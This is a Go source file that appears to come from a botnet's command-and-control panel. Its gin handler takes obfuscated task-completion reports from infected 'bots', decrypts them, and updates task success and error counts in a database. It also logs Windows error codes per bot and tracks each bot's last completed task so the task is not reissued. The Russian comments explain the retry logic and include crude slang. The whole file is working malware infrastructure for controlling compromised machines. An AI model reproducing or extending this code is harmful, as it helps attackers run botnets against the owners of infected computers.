package complete

import (
	"log"
	"net/http"
	"strings"

	database "../../../db"
	structures "../../../structures"
	obf "../obf"

	"github.com/gin-gonic/gin"
)

var db = database.Connect()

/*
	Обработчик выполненных заданий
*/
func TaskComplete(ctx *gin.Context) {
	data_enc := ctx.PostForm("data")
	data := strings.Split(obf.Decrypt(data_enc), "|")
	if len(data) < 4 {
		// значит бот отправил какую-то залупу, отправляем на выполнение этого таска снова
		ctx.String(http.StatusOK, obf.Encrypt("ping|"))
		return
	}
	completedTask := structures.CompletedTaskData{
		TaskId:           data[0],
		Uid:              data[1],
		Error:            data[2],
		GetLastErrorCode: data[3],
	}

	// если задание выполнено без ошибок
	if completedTask.Error == "0" {
		// инкрементируем счётчик успешных выполнений
		_, err := db.Exec("UPDATE `tasks` SET `Runs` = `Runs` + 1 WHERE `Id` = ?", completedTask.TaskId)
		if err != nil {
			log.Println("complete.TaskComplete:", err)
		}
	} else {
		// инкрементируем счётчик ошибок
		_, err := db.Exec("UPDATE `tasks` SET `Errors` = `Errors` + 1 WHERE `Id` = ?", completedTask.TaskId)
		if err != nil {
			log.Println("complete.TaskComplete:", err)
		}

		// пишем ошибку в таблицу
		_, err = db.Exec("INSERT INTO `errors` (`TaskId`, `Uid`, `Error`, `GetLastErrorCode`) VALUES(?, ?, ?, ?)",
			completedTask.TaskId,
			completedTask.Uid,
			completedTask.Error,
			completedTask.GetLastErrorCode,
		)
		if err != nil {
			log.Println("complete.TaskComplete:", err)
		}
	}

	// устанавливаем для бота последнее выполненное задание, чтобы не выдать повторно
	_, err := db.Exec("UPDATE `bots` SET `TaskId` = ? WHERE `Uid` = ?", completedTask.TaskId, completedTask.Uid)
	if err != nil {
		log.Println("complete.TaskComplete:", err)
	}
}
